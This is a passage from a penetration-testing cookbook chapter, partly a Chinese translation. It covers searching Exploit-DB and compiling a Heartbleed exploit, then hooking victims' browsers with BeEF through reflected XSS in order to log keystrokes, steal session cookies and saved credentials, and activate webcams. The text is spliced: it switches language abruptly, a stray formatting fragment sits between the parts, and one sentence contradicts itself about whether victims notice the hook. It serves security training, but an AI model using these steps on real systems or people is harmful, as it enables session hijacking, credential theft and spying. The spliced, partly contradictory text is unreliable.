    ## 高级利用 - 第 7 部分


    ### 第 7 章


    在本章中，我们将涵盖：

    - 在 `Exploit-DB` 中搜索 Web 服务器漏洞

    - 利用 `Heartbleed` 漏洞

    - 使用 `BeEF` 利用 `XSS`

    - 利用 `Blind SQLi`

    - 使用 `SQLMap` 获取数据库信息

    - 执行跨站请求伪造攻击

    - 使用 `Shellshock` 执行命令

    - 使用字典通过 `John the Ripper` 破解密码哈希值

    - 使用 `hashcat` 通过暴力破解破解密码哈希值


    ### 引言

    在受益于一些相对容易发现和利用的漏洞之后，我们现在将转向其他可能需要我们作为渗透测试人员付出更多精力的问题。


    在本章中，我们将搜索漏洞利用、编译程序、搭建服务器并破解密码，这些将允许我们访问敏感信息并在服务器和应用程序中执行特权函数。


    171


    [Technet24.ir](http://technet24.ir) - 高级利用


    ### 在 Exploit-DB 中搜索 Web 服务器漏洞

    我们不时会在服务器的操作系统、Web 应用程序使用的库、活动服务中发现漏洞，或者是另一个无法从浏览器或网络代理利用的安全漏洞。在这些情况下，我们可以使用 `Metasploit`
    的漏洞利用集，或者如果我们需要的不在 `Metasploit` 中，我们可以在 `Exploit-DB` 中搜索。


    Kali Linux 包含了 `Exploit-DB` 中漏洞的副本供离线使用；在本教程中，我们将使用 Kali 自带的命令来探索数据库并找到我们需要的漏洞利用。


    #### 如何操作

    1. 打开终端。

    2. 输入以下命令：

    ```

    searchsploit heartbleed

    ```

    3. 下一步是将漏洞程序复制到我们可以修改它的地方（如果需要的话），然后按照所示进行编译：

    ```

    mkdir heartbleed

    cd heartbleed

    cp /usr/share/exploitdb/platforms/remote/32998.c .

    ```

    4. 通常，漏洞程序的前几行包含了一些关于自身以及如何使用它们的信息，如下所示：

    ```

    head -n 30 32998.c

    ```

    172


    #### 第 7 章

    5. 在这种情况下，漏洞程序是 `C` 语言编写的，因此我们需要对其编译才能运行。文件中显示的编译命令（`gcc -lssl -lssl3 -lcrypto
    heartbleed.c -o heartbleed`）在 Kali Linux 中无法正常运行，我们需要使用以下命令：

    ```

    gcc 32998.c -o heartbleed -Wl,-Bstatic -lssl -Wl,-dynamic -lssl3 -lcrypto

    ```

    173


    ### 利用 Heartbleed 漏洞

    #### 工作原理

    `searchsploit` 命令是 Kali Linux 上的本地 `Exploit-DB` 副本的接口，它会在漏洞程序的标题和描述中查找字符串并显示结果。


    漏洞程序位于 `/usr/share/exploitdb/platforms` 目录。`searchsploit` 显示的漏洞路径是相对于该目录的，这就是为什么当我们复制文件时使用了完整路径。漏洞程序也以它们提交到
    `Exploit-DB` 时分配的漏洞编号命名。


    编译步骤的方法与源代码中推荐的方法不同，因为基于 Debian 的发行版中的 `OpenSSL` 库由于其构建方式而缺少某些功能。


    #### 更多内容

    在生产系统中使用漏洞程序之前，监控其效果和影响是非常重要的。通常，`Exploit-DB` 中的漏洞程序是可信的，尽管它们通常需要针对特定情况进行一些调整才能工作，但其中某些可能无法实现其声称的功能；因此，我们需要先在实验室这样的控制环境中对其进行测试。

    '
- fmt: '

    Before we start, we need to be sure that we have started the BeEF service and
    are capable of accessing `http://127.0.0.1:3000/ui/panel` (with `beef/beef` as
    login credentials).


    1. The default BeEF service in Kali Linux doesn''t work so we cannot simply run
    `beef-xss` to get BeEF running, instead we need to run it from the directory in
    which it was installed, as shown here:


    ```

    cd /usr/share/beef-xss/

    ./beef

    ```


    178

    ![](index-197_1.png)


    ## Chapter 7


    ![](index-198_1.png)


    2. Now, browse to `http://127.0.0.1:3000/ui/panel` and use `beef` as both the
    username and password. If that works, we are ready to continue.


    ### How to do it...


    1. BeEF needs the client browser to call the `hook.js` file, which is the one
    that hooks the browser to our BeEF server and we will use an application vulnerable
    to XSS to make the user call it. To try a simple XSS test, browse to `http://192.168.56.102/bodgeit/search.jsp?q=%3Cscript%3Ealert%28
    1%29%3C%2Fscript%3E`.


    179

    ![](index-198_2.png)


    [Technet24.ir](http://technet24.ir)

    *Advanced Exploitation*


    2. That is an application vulnerable to XSS so now we need to change the script
    to call `hook.js`. Imagine that you are the victim and you have received an e-mail
    containing a link to `http://192.168.56.102/bodgeit/search.jsp?q=`, you browse
    to that link to see the following:


    ![](index-199_1.png)


    3. Now, in the BeEF panel, the attacker will see a new online browser:

    ![](index-199_2.png)


    4. The best step for the attacker now is to generate some persistence, at least
    while the user is navigating in the compromised domain. Go to the Commands tab
    in the attacker''s browser and, from there, to `Persistence | Man-In-The-Browser`
    and then click on Execute. After executing, select the relevant command in `Module
    Results History` to check the results, as shown:


    180

    ![](index-199_3.png)


    ## Chapter 7


    ![](index-200_1.png)


    5. If we check the Logs tab in the browser, we may see that BeEF is storing information
    about what the actions the user is performing in the browser''s window, like typing
    and clicking, as we can see here:

    ![](index-200_2.png)


    181

    ![](index-200_3.png)


    [Technet24.ir](http://technet24.ir)

    *Advanced Exploitation*


    6. We can also obtain the session cookie by using `Commands | Browser | Hooked
    Domain | Get Cookie`, as illustrated:

    ![](index-201_1.png)


    ### How it works...


    In this recipe, we used the `src` property of the `script` tag to call an external
    JavaScript file, in this case the hook to our BeEF server. `hook.js` file communicates
    with the server, executes the commands and returns the responses so that the attacker
    can see them; it prints nothing in the client''s browser so the victim will generally
    know that his or her browser has been compromised. After making the victim execute
    our hook script, we used the persistence `Man In The Browser` to make the browser
    execute an AJAX request every time the user clicks a link to the same domain so
    that this request keeps the hook and also loads the new page. We also saw that
    BeEF''s log keeps a record of every action the user performs on the page and we
    were able to obtain a username and password from this. It was also possible to
    obtain the session cookie remotely which could have allowed an attacker to hijack
    the victim''s session.


    ### There''s more...


    BeEF has an incredible amount of functionality, from ascertaining the type of
    browser the victim is using, to the exploitation of known vulnerabilities and
    the complete compromise of the client system. Some of the interesting features
    are as follows:


    - `Social Engineering/Pretty Theft`: This is a social engineering tool allows
    us to simulate a login popup resembling common services like Facebook, LinkedIn,
    and others.

    - `Browser/Webcam` and `Browser/Webcam HTML5`: As obvious as it might seem, these
    two modules are able to abuse a permissive configuration to activate the victim''s
    webcam, the first uses a hidden embed and the other uses HTML5.

    - `Exploits`: This contains a collection of exploits for specific situations,
    some of them exploit servers and others the client''s browser.


    182

    ![](index-201_2.png)


    ## Chapter 7


    - `Browser/Hooked Domain/Getored Credentials`: This attempts to extract the username
    and passwords for the compromised domains stored in the browser.

    - `Use as Proxy`: If we right-click on hooked browser we get the option to use
    it as proxy which makes the client''s browser a web proxy; this may give us the
    chance to explore the victim''s internal network.


    There are many other attacks and modules in BeEF that are useful to a penetration
    tester; if you want to learn more, can check the official Wiki at: `https://github.com/beefproject/beef/wiki`


    ### Exploiting a Blind SQLi


    In *Chapter 6*, *Exploitation – Hanging Fruits*, we exploited an error-based SQL
    Injection and now we will identify and exploit a Blind SQL Injection using Burp
